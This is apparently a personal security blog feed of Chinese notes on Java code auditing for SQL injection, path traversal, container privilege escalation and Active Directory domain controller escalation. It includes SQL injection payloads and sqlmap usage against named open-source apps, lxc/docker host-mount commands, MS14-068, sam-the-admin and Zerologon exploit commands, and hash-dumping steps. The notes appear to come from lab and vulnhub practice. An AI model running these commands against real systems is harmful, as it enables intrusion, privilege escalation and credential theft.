FileInputStream(-&gt;image-&gt;f.getPath()-&gt;path-&gt;startpath</p><p>&#x2F;image&#x2F;&#x2F;&#x2F;image..&#x2F;&#x2F;image..&#x2F;&#x2F;image..&#x2F;&#x2F;image..&#x2F;&#x2F;image..&#x2F;&#x2F;image..&#x2F;&#x2F;IDEA.txt</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719132728786-b439cbca-19ad-41b4-a3f0-472b8a9bc98e.png"></p><p>把上面地址都输出打印确定一下，打印出来位置，确定和想要读取的文件位置之前的关系，进行绕过</p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>鉴权</p><p>1、过滤器：看逻辑</p><p>2、自定义代码：看逻辑</p><p>3、shiro框架：找版本漏洞 </p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java代码审计-sql注入</title>
      <link href="/2024/11/01/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2024/11/01/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h1><p>JavaEE代码审计：</p><p>一、代码编辑器：</p><p>1.Jetbrains IDEA(IDE)</p><p>2.Sublime text(文本编辑器)</p><p>3.Eclipse (IDE)</p><p>二、测试工具：</p><p>1.Burp Suite：是渗透测试工作者必备的一款工具</p><p>2.SwitchyOmega：SwitchyOmega 是一款代理管理插件，支持Firefox和Chrome浏览器，并支持HTTP、HTTPS、socket4和socket5协议。</p><p>3.Max HackerBar：HackBar是的一个插件，也是信息安全从业者常用的经典工具。</p><p>4.Postman：Postman是一款功能强大的网页调试工具，能够为用户提供强大的Web API &amp; HTTP请求调试功能。</p><p>5.Ysoserial：一款开源Java反序列化测试工具，内部集成有多种利用链，可以快速生成用于攻击的代码，也可以将新公开的反序列化漏洞利用方式自行加入Ysoserial中。</p><p>6.Marshalsec：是一款开源的Java反序列化测试工具，不仅可以生成各类反序列化利用链，还可以快速启动恶意的RMI服务等。</p><p>7.MySQL Monitor：是Web版本的SQL记录实时监控工具。</p><p>8.Beyond Compare：是一款文件比较工具，主要对比两个文件夹或者文件，并以颜色标示差异，比较范围包括目录、文档内容等。使用该工具可以方便代码审计人员快速地比对两个版本代码的差别。</p><p>三、反编译工具</p><p>1.JD-GUI：是一款具有UI界面的反编译工具，界面简洁大方，使用简单方便。</p><p>2.Fernflower：功能比JD-GUI更强大，虽然没有UI界面，但可以配合系统指令完成批量反编译的工作。</p><p>3.CFR：功能强大的反编译工具，支持主流Java特性——Java8 lambda表达式，以及Java7字符串切换。在某些JD-GUI无法反编译的情况下，CFR仍然能完美地进行反编译，也可以像FernFlower那样配合系统指令进行批量反编译。</p><p>4.IntelliJ IDEA：具能够自动解包已添加依赖的Jar包，并对其内容进行反编译。该工具拥有动态调试和字符串匹配和搜索功能，为审计和调试漏洞工作提供了极大便利。</p><p>5.CodeReviewTools：是一款可以快速搜索代码中的关键点，一键对jar进行批量反编译，也支持直接对war包进行操作。</p><p>四、Java代码静态扫描工具</p><p>1.Fortify SCA：获得业界认可的静态代码检查工具，但它是收费的。Fortify SCA的核心在于规则库，用户可以自定义规则库，减少误报。</p><p>2.VCG：基于 VB 开发的一款Windows下的白盒审计工具。VCG 支持多种语言，例如C&#x2F;C++、Java、C#、VB、PL&#x2F;SQL、PHP。VCG会根据代码中的变量名等信息动态生成针对该代码的漏洞规则，通过正则检查是否有和漏洞规则所匹配的代码。</p><p>3.FindBugs与FindSecBugs插件：FindBugs是一款Bug扫描插件，在IDEA和Eclipse中都可进行安装。FindBugs可以帮助开发人员发现代码缺陷，减少Bug，但其本身并不具备发现安全漏洞的能力，需要安装FindSecBugs拓展发现安全漏洞的能力。</p><p>4.SpotBugs：是FindBugs的继任者，所以二者用法基本一样，可以独立使用，也可以作为插件使用。</p><p>5.CheckMark：白盒代码审计解决方案，主要通过采用独特的词汇分析技术和CxQL专利查询技术对应用程序源码进行静态分析检查。</p><p>6.Snyk插件：修复项目中的安全漏洞、基础架构错误配置和代码质量问题。</p><p>7.Sensei插件：可在键入时扫描和修复易受攻击的代码 - 具有数百个可下载的安全编码配方（规则）以及内置的自行制作能力。</p><p>8.Reshift Security插件：可以快速发现漏洞，提供多个代码修复片段，以及丰富的文档，涵盖了每个漏洞的检测、修复和测试。</p><p>9.MurphySec CodeScan插件：可以快速识别您的项目中使用了哪些存在安全缺陷的开源组件，并帮助您一键修复问题。</p><p>10.Momo CodeSecInspector插件：重于在编码过程中发现项目潜在的安全风险，并提供一键修复能力。</p><p>11.dependence-check：可用于检查已发布安全漏洞的项目依赖项。</p><p>12.wJa：一款结合DAST、SAST、IAST的综合性应用程序安全分析工具，支持对java web程序的安全性进行分析，含有反编译，代码审计，调试jar包，代理追踪等用于分析软件安全的功能。</p><p>13.tabby：是一款针对Java语言的静态代码分析工具，它使用静态分析框架 Soot 作为语义提取工具，将JAR&#x2F;WAR&#x2F;CLASS文件转化为代码属性图，并使用 Neo4j 图数据库来存储生成的代码属性图CPG。</p><p>14.SpringInspector：Java自动代码审计工具，尤其针对Spring框架，提供一个SpringBoot的Jar包即可进行自动代码审计，底层技术基于字节码分析。</p><p>15.gadgetinspector：反序列化漏洞利用链、漏洞检测工具。</p><p>开发审计入口常见方法：</p><p>-搜索法：常规或部分MVC模型源码可以采用关键字的搜索挖掘思路</p><p>-功能法：框架MVC模型源码一般会采用功能点分析抓包追踪挖掘思路</p><p>-对比法：可以通过前后修复版本文件及代码不同特征进行针对挖掘思路</p><p>-特征法：数据库监控挖SQL注入，文件监控挖上传删除写入等，后续补充</p><p>-调试法：动态调试（PHP,ASP.NET,JavaEE,Python等）</p><p>-工具法：后续讲到（DAST&amp;SAST&amp;IAST&amp;CodeQL等）</p><table><thead><tr><th align="center">类别</th><th align="center">测试项</th></tr></thead><tbody><tr><td align="center">认证鉴权</td><td align="center">登录密码是否加密</td></tr><tr><td align="center"></td><td align="center">是否可猜解用户名</td></tr><tr><td align="center"></td><td align="center">是否可批量注册用户</td></tr><tr><td align="center"></td><td align="center">是否存在验证码</td></tr><tr><td align="center"></td><td align="center">验证码有效性</td></tr><tr><td align="center"></td><td align="center">是否登录会话固定</td></tr><tr><td align="center"></td><td align="center">会话ID是否足够复杂</td></tr><tr><td align="center"></td><td align="center">注销功能是否有效</td></tr><tr><td align="center"></td><td align="center">登录身份校验算法是否可逆</td></tr><tr><td align="center"></td><td align="center">修改密码处是否验证旧密码</td></tr><tr><td align="center"></td><td align="center">Cookie中是否存在敏感信息</td></tr><tr><td align="center">信息泄露</td><td align="center">是否存在中间件错误页面</td></tr><tr><td align="center"></td><td align="center">是否暴露异常处理报错信息</td></tr><tr><td align="center"></td><td align="center">是否存在源代码泄露</td></tr><tr><td align="center"></td><td align="center">源代码注释信息</td></tr><tr><td align="center"></td><td align="center">是否存在用户敏感信息明文传输</td></tr><tr><td align="center">文件I&#x2F;O</td><td align="center">是否存在任意文件上传</td></tr><tr><td align="center"></td><td align="center">是否存在任意文件下载</td></tr><tr><td align="center"></td><td align="center">是否存在文件包含漏洞</td></tr><tr><td align="center">数据验证</td><td align="center">是否存在反射型XSS</td></tr><tr><td align="center"></td><td align="center">是否存在存储型XSS</td></tr><tr><td align="center"></td><td align="center">是否存在DOM型的XSS</td></tr><tr><td align="center"></td><td align="center">是否存在SQL注入漏洞</td></tr><tr><td align="center"></td><td align="center">是否存在命令执行漏洞</td></tr><tr><td align="center"></td><td align="center">是否存在URL跳转漏洞</td></tr><tr><td align="center"></td><td align="center">是否http头CRLF注入</td></tr><tr><td align="center"></td><td align="center">是否存在SSRF漏洞</td></tr><tr><td align="center"></td><td align="center">是否存在跨站请求伪造漏洞</td></tr><tr><td align="center">逻辑流程</td><td align="center">是否存在横向越权</td></tr><tr><td align="center"></td><td align="center">是否存在垂直越权</td></tr><tr><td align="center"></td><td align="center">是否存在逻辑绕过</td></tr><tr><td align="center"></td><td align="center">是否存在未授权访问</td></tr><tr><td align="center">组件安全</td><td align="center">是否存在中间件组件漏洞</td></tr><tr><td align="center"></td><td align="center">是否开发组件漏洞</td></tr><tr><td align="center">接口安全</td><td align="center">是否存在短信炸弹漏洞</td></tr><tr><td align="center"></td><td align="center">是否存在邮件炸弹漏洞</td></tr><tr><td align="center"></td><td align="center">是否存在微信推送炸弹漏洞</td></tr><tr><td align="center">其他</td><td align="center">是否存在危险的HTTP方法</td></tr><tr><td align="center"></td><td align="center">是否CORS配置不当</td></tr><tr><td align="center"></td><td align="center">是否能存在HOST攻击</td></tr><tr><td align="center"></td><td align="center">是否存在接口请求未鉴权</td></tr></tbody></table><h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>1、三个模式：</p><p>JDBC，Mybatis，Hibernate又称HQL</p><p>2、出现注入：</p><p> 原生JDBC是否存在直接拼接SQL语句（使用+，或者使用StringBUilderappend()），未经过预编译；</p><p>Mybatis使用${}；</p><p>Hibernate、JPA默认是经过预编译的，但是如果开发自己编写的SQL语句，也需要进行检查；</p><p>Java是强类型语言，当注入参数为long、int等数字类型时无法进行注入；</p><p>找到危险函数位置之后，向上搜索，找函数、方法调用位置，直到请求入口（controller层），判断是否存在无害化处理、无害化处理是否严格；</p><p>参考：<a href="https://mp.weixin.qq.com/s/9t3t6qxosGsKiXMIRtMoPw">https://mp.weixin.qq.com/s/9t3t6qxosGsKiXMIRtMoPw</a></p><p>3、判断模式：</p><p>-看项目说明使用的技术框架</p><p>-看引用中加载那些技术框架</p><p>-看配置源码中相关配置文件</p><p>Mybatis喜欢用xml配置文件来定义sql语句，具体可以参考上面的链接</p><p>4、入口确定:</p><p>1、是否使用预编译技术，预编译是否完整。</p><p>2、定位SQL语句上下文，查看是否有参数直接拼接，是否有对模糊查询关键字的过滤。</p><p>3、Mybatis框架则搜索${}，四种情况无法预编译：like模糊查询、order by排序、范围查询in、动态表名&#x2F;列名，只能拼接，所以还是需要手工防注入，此时可查看相关逻辑是否正确。</p><p>4、JPA搜索JpaSort.unsafe()，查看是否用实体之外的字段对查询结果排序，进行了SQL的拼接。以及查看EntityManager的使用，也可能存在拼接SQL的情况。</p><p>Statement</p><p>createStatement</p><p>PrepareStatement</p><p>like ‘%${</p><p>in(${</p><p>in (${</p><p>select</p><p>update</p><p>insert</p><p>delete</p><p>${</p><p>order by</p><p>setObject(</p><p>setInt(</p><p>setString(</p><p>setSQLXML(</p><p>createQuery(</p><p>createSQLQuery(</p><p>createNativeQuery</p><p>…….</p><h2 id="非框架JDBC-Jfinal-cms论坛系统"><a href="#非框架JDBC-Jfinal-cms论坛系统" class="headerlink" title="非框架JDBC-Jfinal_cms论坛系统"></a>非框架JDBC-Jfinal_cms论坛系统</h2><p><a href="https://github.com/jflyfox/jfinal_cms">https://github.com/jflyfox/jfinal_cms</a></p><p>分析：确定非框架（看meaven库发现没有Mybatis，Hibernate）-&gt;搜关键字order by append-&gt;getBaseForm()-&gt;getOrderBy()-&gt;getOrderColumn-&gt;orderColumn</p><p>路由：Post:&#x2F;admin&#x2F;advicefeedback&#x2F;list</p><p>参数：form.orderColumn</p><p>拼接：order by “).append(orderBy);</p><p>Poc：’ xxx #(直接sqlmap搜哈)</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718892315037-fafee04b-722a-4967-b3df-9e330e6e91e6.png"></p><p>跟进去看orderBy变量是否可控</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718892475812-b9a9fac6-a41a-432b-b42f-d2e02a1cd2d6.png"></p><p>接着跟两个函数</p><p>getBaseForm()-&gt;getOrderBy()-&gt;getOrderColumn-&gt;orderColumn</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718892640873-58fdc5ca-b9e8-4090-8367-84eda3048af6.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718892744038-65906285-ba21-415c-9572-d42d9aa0b9c3.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718893051410-20938fcf-a290-4630-b063-2d2c31164352.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718893082232-04f6ffd8-1199-46e2-a6a7-736844f21d33.png"></p><p>路由：Post:&#x2F;admin&#x2F;advicefeedback&#x2F;list</p><p>参数：form.orderColumn </p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718893544735-9cea2452-9f4f-4fbc-812e-5e677df03ddc.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tb_advice_feedback t where <span class="number">1</span>=<span class="number">1</span> order by orderBy</span><br></pre></td></tr></table></figure><p>拼接：order by “).append(orderBy);</p><p>Poc：’ xxx #(直接sqlmap搜哈)</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718894011179-873efa15-d6a8-4d76-9711-f9f717431ce4.png"> burp开启后，随便点一下触发，抓包时不要用localhost或者127.会抓不全</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718896381918-46159c1a-9629-4c03-8212-74fb63dd020a.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718896451394-74fc8133-1477-478f-aaed-c20e126944f7.png"></p><p>python3.exe sqlmap.py -r ifcms.txt</p><p>梭哈</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718897493345-89469dbd-be2d-470e-a6e1-b6413ddfac5c.png"></p><h2 id="SpringBoot-Mybatis-Oasys办公系统"><a href="#SpringBoot-Mybatis-Oasys办公系统" class="headerlink" title="SpringBoot+Mybatis-Oasys办公系统"></a>SpringBoot+Mybatis-Oasys办公系统</h2><p><a href="https://gitee.com/aaluoxiang/oa_system">https://gitee.com/aaluoxiang/oa_system</a></p><p>分析：确定Mybatis框架-&gt;搜关键字${-&gt;%${baseKey}%-&gt;sortMyNotice-&gt;sortMyNotice-&gt;informListPaging-&gt;</p><p>路由：Post:&#x2F;informlistpaging</p><p>参数：baseKey</p><p>拼接：and n.title LIKE ‘%${baseKey}%’</p><p>Poc：’ xxx #(直接sqlmap搜哈)</p><p>看pom文件有mybatis库确认为Mybatis框架</p><p>在xml文件中搜%${</p><p>介绍个插件，点击小鸟图标可以直接跟进去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718981243781-c0b03fec-80f6-45cd-a7e6-4a7051852c11.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718981286518-a978400e-6f00-4a95-8bda-5e4ab765e039.png"></p><p>右键，转到</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718981404667-7c2e3af4-7b86-42f2-8aa1-9b2ca0af9bb4.png"></p><p>再看一下路由地址</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718981495059-d0aaf84c-11a7-4e7c-bd5f-932862df1e6a.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718981515613-a75d7fc1-c9a5-4aca-862c-c76ad19083ed.png"></p><p>按照说明书配置application.properties</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718982202019-1ccb2354-a692-4ae2-81f9-b60098dc922a.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718982343393-8cbb437d-2767-4826-a01d-1fdf3112e761.png"></p><p>抓包</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718982403861-bc5640f6-f66a-4655-933a-a1188d51de27.png"></p><p>把127.0.0.1换成<a href="http://10.211.55.3/">http://10.211.55.3/</a></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718982606106-5c6fe712-d420-4275-b95b-0b2d34e92f71.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718982709936-427de715-cb96-4714-9bf8-53a7cabb519b.png"></p><p>梭哈</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718982839730-a75a2e97-40a2-497f-a7fa-3cd1399dbd6f.png"></p><h2 id="SpringBoot-Mybatis-Ruoyi若依系统-V4-6"><a href="#SpringBoot-Mybatis-Ruoyi若依系统-V4-6" class="headerlink" title="SpringBoot+Mybatis-Ruoyi若依系统 V4.6"></a>SpringBoot+Mybatis-Ruoyi若依系统 V4.6</h2><p><a href="https://gitee.com/y_project/RuoYi">https://gitee.com/y_project/RuoYi</a></p><p>基于springboot中，执行SQL三个调用：</p><p>1、业务层调用dao层</p><p>2、controller调用Service层间接调用dao层</p><p>3、controller直接调用dao层</p><p>分析：确定Mybatis框架-&gt;搜关键字${-&gt;updateDeptStatus-&gt;updateParentDeptStatus-&gt;updateDept-&gt;editSave</p><p>路由：Post:&#x2F;system&#x2F;dept&#x2F;edit</p><p>参数：ancestors</p><p>拼接：where dept_id in (${ancestors})</p><p>Poc：DeptName&#x3D;1&amp;DeptId&#x3D;100&amp;ParentId&#x3D;12&amp;Status&#x3D;0&amp;OrderNum&#x3D;1&amp;ancestors&#x3D;0)or(extractvalue(1,concat((select user()))));#</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718986279673-4e4406ce-ce0d-46cd-afba-1760b2baba35.png"></p><p>跟进去，看到最上面没有路由，再跟</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718986327535-60aa1522-c5af-45f0-bcfd-b73f72839c63.png"></p><p>再往上找</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718986449204-4c5031bb-4067-488e-bbf2-82e10335a582.png"></p><p>再往上跟</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718986489399-8b618f9a-5d83-4f05-aeec-c6cbc122eae2.png"></p><p>跟到controller，最上面有路由地址</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718986618834-e0df9760-667c-45f9-b158-05112654a9ea.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718986571868-8f3ac22e-c6d0-4164-835a-70ffa342b3db.png"></p><p>分析</p><p>路由：Post:&#x2F;system&#x2F;dept&#x2F;edit</p><p>直接访问无法触发，根据源码里面的中文信息，跟随页面</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718987086221-332f5a05-8b56-4b48-83a5-39a4696c193c.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718987132612-d2700d09-5e7b-4804-ad43-9cf8f8dba1fb.png"></p><p>修改最下面的信息</p><p>参数：ancestors</p><p>拼接：where dept_id in (${ancestors})</p><p>Poc：DeptName&#x3D;1&amp;DeptId&#x3D;100&amp;ParentId&#x3D;12&amp;Status&#x3D;0&amp;OrderNum&#x3D;1&amp;ancestors&#x3D;0)or(extractvalue(1,concat((select user()))));#</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718987175889-de4d33a8-43af-4d09-a987-e4fedc0afe3d.png"></p><p>也可以sqlmap一把梭哈</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>容器&amp;域控权限提升</title>
      <link href="/2024/10/16/%E5%86%85%E7%BD%91/%E5%AE%B9%E5%99%A8&amp;%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83/"/>
      <url>/2024/10/16/%E5%86%85%E7%BD%91/%E5%AE%B9%E5%99%A8&amp;%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h1 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h1><p>LXD、LXC 和 Docker 是三种不同的容器化技术，它们在实现和使用上有一些区别。</p><p>总结来说，LXD是基于LXC的系统级容器管理器，提供了更高级别的接口和管理工具；LXC是Linux内核提供的一种虚拟化技术，允许在单个Linux内核上运行多个隔离的用户空间实例；而Docker是基于LXC的容器化平台，提供了一套简化容器构建、分发和运行的工具和API。</p><p>LXD（Linux容器守护程序）是一个系统级容器管理器，它基于LXC（Linux容器）技术。LXD提供了更高级别的接口和管理工具，使得轻松创建和管理系统容器成为可能。LXD主要面向系统级容器，可以运行完整的操作系统镜像，并提供类似于虚拟机的环境。它提供了更好的隔离性、资源控制和安全性。</p><p>LXC（Linux容器）是Linux内核提供的一种虚拟化技术，它允许在单个Linux内核上运行多个隔离的用户空间实例。LXC提供了一组工具和API，用于创建和管理容器。LXC容器通常比LXD容器更加灵活和轻量级，可以定制底层操作系统的各个方面。LXC更适合于需要更细粒度控制的使用场景。</p><p>Docker是一个开源的容器化平台，它建立在LXC之上，并提供了一套更高级别的工具和API，使得容器的构建、分发和运行变得更加简单。Docker提供了一个容器镜像的集装箱模型，使得容器可以在不同的环境中进行移植和部署。Docker强调容器的可移植性和易用性，适用于开发、测试和部署应用程序的场景。</p><p>#利用参考：（SUID&amp;SUDO&amp;capability）</p><p><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p><p>两种情况：</p><p>权限在docker：</p><p>逃逸 提权（宿主机）</p><p>权限不在docker：</p><p>借助docker应用去提权（用户归属是docker组 拉镜像 提权）</p><p>下面两个例子都是获得了目标机器上的docker用户组下的用户，通过容器访问到&#x2F;root下的文件</p><h2 id="普通用户-LXD容器"><a href="#普通用户-LXD容器" class="headerlink" title="普通用户-LXD容器"></a>普通用户-LXD容器</h2><p>原理：</p><p>LXD是基于LXC容器的管理程序，当前用户可操作容器，</p><p>理解为用户创建一个容器，再用容器挂载宿主机磁盘，</p><p>最后使用容器权限操作宿主机磁盘内容达到提权效果。</p><p>lxd本地提权条件:</p><p>id看一下用户组</p><p>-已经获得Shell</p><p>-用户属于lxd组</p><p><a href="https://www.vulnhub.com/entry/ai-web-2,357/">https://www.vulnhub.com/entry/ai-web-2,357/</a></p><p>1、入口点：</p><p>User: n0nr00tuser</p><p>Pass: zxowieoi4sdsadpEClDws1sf</p><p>2、检测及利用：</p><p>.&#x2F;LinEnum.sh</p><p><a href="https://github.com/saghul/lxd-alpine-builder">https://github.com/saghul/lxd-alpine-builder</a></p><p>3、创建容器，挂载磁盘，进入容器，进入目录提权</p><p>lxc image import .&#x2F;alpine-v3.13-x86_64-20210218_0139.tar.gz –alias test</p><p>lxc init test test -c security.privileged&#x3D;true</p><p>lxc config device add test test disk source&#x3D;&#x2F; path&#x3D;&#x2F;mnt&#x2F;root recursive&#x3D;true&#x2F;&#x2F; 把目标机器的&#x2F;拉到镜像里的&#x2F;mnt&#x2F;root</p><p>访问虚拟环境中的&#x2F;mnt&#x2F;root就相当于访问目标机器的&#x2F;</p><p>lxc start test</p><p>lxc exec test &#x2F;bin&#x2F;sh</p><p>cd &#x2F;mnt&#x2F;root&#x2F;root</p><p>cat flag.txt</p><h2 id="普通用户-Docker容器"><a href="#普通用户-Docker容器" class="headerlink" title="普通用户-Docker容器"></a>普通用户-Docker容器</h2><p>把一个普通账号test添加到docker组，</p><p>使用newgrp将root初始组切换为docker</p><p>usermod -G docker test把test加入到docker组</p><p>newgrp docker&#x2F;&#x2F;生效</p><p>su test</p><p>docker run -v &#x2F;:&#x2F;mnt -it alpine&#x2F;&#x2F;将真机的&#x2F;放到docker的&#x2F;mnt上 ，alpine是镜像名字</p><p>ls &#x2F;mnt&#x2F;root</p><p>Docker本地提权条件:</p><p>1、已经获得Shell</p><p>2、用户属于docker组</p><p>参考：云上安全笔记的逃逸</p><p><a href="https://www.vulnhub.com/entry/chill-hack-1,622/">https://www.vulnhub.com/entry/chill-hack-1,622/</a></p><p>1、入口点：</p><p>User: anurodh</p><p>Pass: !d0ntKn0wmYp@ssw0rd</p><p>2、检测及利用：</p><p>.&#x2F;LinEnum.sh</p><p>3、创建容器，挂载磁盘，进入容器，进入目录提权</p><p>docker run -v &#x2F;:&#x2F;mnt -it alpine</p><p>cd &#x2F;mnt&#x2F;root</p><p>-基本就是获取&#x2F;etc&#x2F;shadow</p><p>-写到宿主机SSH密钥</p><p>-写到宿主机计划任务</p><p>-CVE利用反弹</p><h1 id="域控"><a href="#域控" class="headerlink" title="域控"></a>域控</h1><p>#实战场景：</p><p>通过技术手段拿下内网域环境下某一台服务器权限或某主机上的域用户账号密码后，</p><p>与AD域控网络通讯正常的情况下，可直接使用域控提权CVE漏洞进行域控权限提升。</p><p>192.168.3.21是域控地址 OWA2010CN-GOD域控主机</p><h2 id="WIN-AD域控提权-CVE-2014-6324"><a href="#WIN-AD域控提权-CVE-2014-6324" class="headerlink" title="WIN-AD域控提权-CVE-2014-6324"></a>WIN-AD域控提权-CVE-2014-6324</h2><p>前提条件：</p><p>1、需要域用户账号密码</p><p>2、一台主机的管理员权限</p><p>whoami &#x2F;user&#x2F;&#x2F;获取当前域内用户SID值</p><p>net time &#x2F;domain&#x2F;&#x2F;查看域内控制地址</p><p>net config workstation</p><p>ms14-068.exe -u 域成员名@域名 -p 域成员密码 -s 域成员sid -d 域控制器地址</p><p>ms14-068.exe -u <a href="mailto:&#109;&#x61;&#x72;&#x79;&#x40;&#x67;&#111;&#100;&#x2e;&#x6f;&#x72;&#103;">&#109;&#x61;&#x72;&#x79;&#x40;&#x67;&#111;&#100;&#x2e;&#x6f;&#x72;&#103;</a> -p admin!@#45 -s S-1-5-21-1218902331-2157346161-1782232778-1124 -d OWA2010CN-God.god.org&#x2F;&#x2F;会保存票据等一些信息</p><p>&#x2F;&#x2F;下面是mimikaz工具</p><p>kerberos::list</p><p>kerberos::purge&#x2F;&#x2F;清除票据</p><p>kerberos::ptc “<a href="mailto:&#x54;&#x47;&#x54;&#x5f;&#116;&#x65;&#115;&#116;&#x30;&#50;&#64;&#116;&#101;&#115;&#x74;&#x2e;&#x6c;&#x61;&#98;&#x2e;&#x63;&#x63;&#97;&#99;&#x68;&#101;">&#x54;&#x47;&#x54;&#x5f;&#116;&#x65;&#115;&#116;&#x30;&#50;&#64;&#116;&#101;&#115;&#x74;&#x2e;&#x6c;&#x61;&#98;&#x2e;&#x63;&#x63;&#97;&#99;&#x68;&#101;</a>“&#x2F;&#x2F;导入票据</p><p>dir\OWA2010CN-God.god.org\C$</p><p>psexec \OWA2010CN-God.god.org cmd&#x2F;&#x2F;链接域控cmd</p><h2 id="WIN-AD域控提权-CVE-2021-42287-影响win服务器全系列到22"><a href="#WIN-AD域控提权-CVE-2021-42287-影响win服务器全系列到22" class="headerlink" title="WIN-AD域控提权-CVE-2021-42287&#x2F;&#x2F;影响win服务器全系列到22"></a>WIN-AD域控提权-CVE-2021-42287&#x2F;&#x2F;影响win服务器全系列到22</h2><p>只需要域用户账号密码</p><p><a href="https://github.com/WazeHell/sam-the-admin">https://github.com/WazeHell/sam-the-admin</a></p><p>python3 sam_the_admin.py 域名&#x2F;‘普通用户:普通用户密码’ -dc-ip 域控IP -shell</p><p>python3 sam_the_admin.py god&#x2F;‘webadmin:admin!@#45’ -dc-ip 192.168.3.21 -shell</p><p>该漏洞利用完会使域内通信不正常，需要退出后再加入域内</p><h2 id="WIN-AD域控提权-CVE-2020-1472"><a href="#WIN-AD域控提权-CVE-2020-1472" class="headerlink" title="WIN-AD域控提权-CVE-2020-1472"></a>WIN-AD域控提权-CVE-2020-1472</h2><p>&#x2F;&#x2F;打完需要恢复，因为域控设置空密码会影响正常域内通信 内网攻防会写怎么恢复</p><p>CVE-2020-1472是继MS17010之后好用的NetLogon特权域控提权漏洞，</p><p>影响Windows Server 2008R2至Windows Server 2019的多个版本系统，</p><p>只要攻击者能访问到目标域控井且知道域控计算机名即可利用该漏洞.</p><p>该漏洞不要求当前计算机在域内,也不要求当前计算机操作系统为Windows.</p><p>计算机名：nbtscan -v -h 192.168.3.21</p><p>漏洞检测：python3 zerologon_tester.py OWA2010CN-GOD 192.168.3.21</p><p>重置空密码：python3 cve-2020-1472-exploit.py OWA2010CN-GOD 192.168.3.21</p><p>连接后导出：python3 secretsdump.py god.org&#x2F;OWA2010CN-GOD$@192.168.3.21 -no-pass&#x2F;&#x2F;导出所有hash</p><p>WMI连接反弹：</p><p>python3 wmiexec.py god&#x2F;<a 